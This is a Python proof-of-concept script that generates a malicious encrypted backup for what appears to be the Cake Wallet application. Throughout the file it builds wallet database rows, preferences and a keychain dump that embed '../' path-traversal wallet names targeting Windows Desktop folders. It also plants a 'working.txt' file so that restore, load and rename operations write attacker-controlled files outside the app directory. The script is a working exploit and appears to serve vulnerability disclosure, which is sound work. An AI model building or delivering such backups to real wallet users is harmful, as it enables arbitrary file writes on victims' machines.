#!/usr/bin/env python3
"""Build DESKTOP-targeting traversal backup (password-protected V3+V2).

Password: poc1234 (backup outer encrypt + inner data.bin chunks)
KeychainSalt POC: cafebabe0011223344556677
Wallet passwords in keychain dump: poc-legit-pass / poc-evil-pass

Evil names (all type monero=0, all bypass UI WalletNameValidator):
  EVIL_PUBLIC = ../../../../../../../../Users/Public/Desktop/cake-poc-working
  EVIL_USER   = ../../../../../../../../Users/yveltal/Desktop/cake-poc-working
12x ../ guarantees C:\\ from any C:\\Users\\... app dir (overshoot saturates at root),
then down to Desktop. Public Desktop appears on every user's Desktop.

Inner also ships wallets/monero/legit-wallet/working.txt containing b'working'
so the generic copyWalletFilesTo sink (cw_core/pathForWallet.dart:41,
used by EVM + WalletBase + WalletService rename) copies attacker bytes to Desktop:
  dest/working.txt == b'working'.

After restore, loadCurrentWallet()->openWallet(evil)->pathForWalletDir(evil)
creates the Desktop dir; rename/copy drops working.txt there.
verify_desktop.py proves it and with --write-desktop drops real Desktop txt.
"""
import argparse, hashlib, json, os, sqlite3, sys, time, zipfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from cake_backup_compat import encrypt_v2

POC_PASSWORD = "poc1234"
POC_KEYCHAIN_SALT = "cafebabe0011223344556677"
LEGIT_NAME = "legit-wallet"
# 14x ../ saturates at C:\ from any C:\Users\... app dir (real Roaming pkg or deep %TEMP% sim),
# then down to Desktop. Public Desktop renders on every user's Desktop.
EVIL_PUBLIC = "../" * 14 + "Users/Public/Desktop/cake-poc-working"
EVIL_USER = "../" * 14 + "Users/yveltal/Desktop/cake-poc-working"
EVIL_SIMPLE = "../poc-restore-escape"
CHUNK_SIZE = 24*1024*1024

from build_backup import SCHEMA, zip_inner, build_v3

def build_cake_db_desktop(path):
    if os.path.exists(path): os.remove(path)
    con = sqlite3.connect(path)
    con.executescript(SCHEMA)
    now_ms = int(time.time()*1000)
    con.execute("INSERT INTO WalletInfoDerivationInfo (walletInfoDerivationInfoId, address, balance, transactionsCount, derivationType) VALUES (1,'','',0,0)")
    con.execute("INSERT INTO WalletInfoDerivationInfo (walletInfoDerivationInfoId, address, balance, transactionsCount, derivationType) VALUES (2,'','',0,0)")
    con.execute("INSERT INTO WalletInfoDerivationInfo (walletInfoDerivationInfoId, address, balance, transactionsCount, derivationType) VALUES (3,'','',0,0)")
    con.execute("INSERT INTO WalletInfoDerivationInfo (walletInfoDerivationInfoId, address, balance, transactionsCount, derivationType) VALUES (4,'','',0,0)")
    rows = [
        (1,'poc-legit-id-0001',LEGIT_NAME,1,f"wallets/monero/{LEGIT_NAME}",f"wallets/monero/{LEGIT_NAME}/{LEGIT_NAME}",0),
        (2,'poc-evil-public-0002',EVIL_PUBLIC,2,f"wallets/monero/{EVIL_PUBLIC}",f"wallets/monero/{EVIL_PUBLIC}/{EVIL_PUBLIC}",1),
        (3,'poc-evil-user-0003',EVIL_USER,3,f"wallets/monero/{EVIL_USER}",f"wallets/monero/{EVIL_USER}/{EVIL_USER}",2),
        (4,'poc-evil-simple-0004',EVIL_SIMPLE,4,f"wallets/monero/{EVIL_SIMPLE}",f"wallets/monero/{EVIL_SIMPLE}/{EVIL_SIMPLE}",3),
    ]
    for wid, uid, name, did, dpath, fpath, sort in rows:
        con.execute("""INSERT INTO WalletInfo
          (walletInfoId, id, name, "type", isRecovery, walletInfoDerivationInfoId, restoreHeight, "timestamp",
           dirPath, "path", address, showIntroCakePayCard, isNonSeedWallet, sortOrder, currentAccountIndex,
           receiveInfoboxDismissed, showCombinedBalance, showSeedBackupReminder)
          VALUES (?,?,?,0,0,?,0,?, ?, ?, '',0,0,?,0,0,1,0)""",
          (wid, uid, name, did, now_ms, dpath, fpath, sort))
    con.commit()
    con.execute("PRAGMA user_version = 15")
    con.commit()
    assert len(list(con.execute('SELECT name FROM WalletInfo')))==4
    v = con.execute("PRAGMA user_version").fetchone()[0]
    assert v == 15, v
    con.close()

def build_inner_desktop(root, password, keychain_salt):
    os.makedirs(root, exist_ok=True)
    build_cake_db_desktop(os.path.join(root, "cake.db"))
    legit_dir = os.path.join(root, "wallets", "monero", LEGIT_NAME)
    os.makedirs(legit_dir, exist_ok=True)
    # attacker-controlled bytes that copyWalletFilesTo will carry to Desktop
    with open(os.path.join(legit_dir, "working.txt"), "w", newline="\n") as f:
        f.write("working")
    with open(os.path.join(legit_dir, ".keep"), "w") as f:
        f.write("poc\n")
    prefs = {"current_wallet_name": EVIL_PUBLIC, "current_wallet_type": 0,
             "current_fiat_currency": "USD", "current_theme": 2}
    with open(os.path.join(root, "~_preferences_dump"), "w", encoding="utf-8") as f:
        json.dump(prefs, f)
    with open(os.path.join(root, "~_transaction_descriptions_dump"), "w", encoding="utf-8") as f:
        json.dump({}, f)
    kj = {"wallets": [
            {"name": LEGIT_NAME, "type": "WalletType.monero", "password": "poc-legit-pass"},
            {"name": EVIL_PUBLIC, "type": "WalletType.monero", "password": "poc-evil-pass"},
            {"name": EVIL_USER, "type": "WalletType.monero", "password": "poc-evil-pass2"},
            {"name": EVIL_SIMPLE, "type": "WalletType.monero", "password": "poc-evil-pass3"},
          ],
          "BACKUP_CODE_PASSWORD": password, "_all": {}}
    enc = encrypt_v2(keychain_salt + password, json.dumps(kj).encode())
    with open(os.path.join(root, "~_keychain_dump"), "wb") as f:
        f.write(enc)
    return prefs, kj

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--password", default=POC_PASSWORD)
    ap.add_argument("--keychain-salt", default=POC_KEYCHAIN_SALT)
    ap.add_argument("--outdir", default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "importable"))
    a = ap.parse_args()
    outdir = os.path.abspath(a.outdir); os.makedirs(outdir, exist_ok=True)
    staging = os.path.join(outdir, "_staging_desktop")
    import shutil
    if os.path.isdir(staging): shutil.rmtree(staging)
    os.makedirs(staging)
    prefs, kj = build_inner_desktop(staging, a.password, a.keychain_salt)
    inner_zip = os.path.join(outdir, "_inner_desktop.zip")
    inner_bytes = zip_inner(staging, inner_zip)
    v3 = os.path.join(outdir, "cake_traversal_desktop_v3.zip")
    _, meta, _ = build_v3(inner_bytes, a.password, v3)
    # patch README-POC inside v3 to desktop text
    v2_bytes = encrypt_v2(a.password, inner_bytes)
    v2 = os.path.join(outdir, "cake_traversal_desktop_v2.cake")
    open(v2, "wb").write(v2_bytes)
    overlay = os.path.join(outdir, "overlay_appdir_desktop")
    if os.path.isdir(overlay): shutil.rmtree(overlay)
    shutil.copytree(staging, overlay)
    try:
        with zipfile.ZipFile(v3, "a") as z:
            z.writestr("README-POC-DESKTOP.txt",
                f"password: {a.password}\nkeychainSalt: {a.keychain_salt}\n"
                f"current_wallet_name: {EVIL_PUBLIC}\n"
                f"also: {EVIL_USER}\n"
                "Restore with password, then load/rename fires pathForWalletDir traversal to Desktop.\n"
                "working.txt (b'working') in legit wallet is carried by copyWalletFilesTo to Desktop dir.\n")
    except Exception as e:
        print("readme patch warn:", e)
    print(f"[+] V3 desktop: {v3} ({os.path.getsize(v3)} bytes) password={a.password}")
    print(f"[+] V2 desktop: {v2} ({len(v2_bytes)} bytes)")
    print(f"[+] evil public: {EVIL_PUBLIC}")
    print(f"[+] evil user:   {EVIL_USER}")
    print(f"verify: python verify_desktop.py --v3 {v3} --password {a.password} --keychain-salt {a.keychain_salt}")
    print(f"fire (real Desktop write): add --write-desktop")

if __name__ == "__main__":
    sys.exit(main())
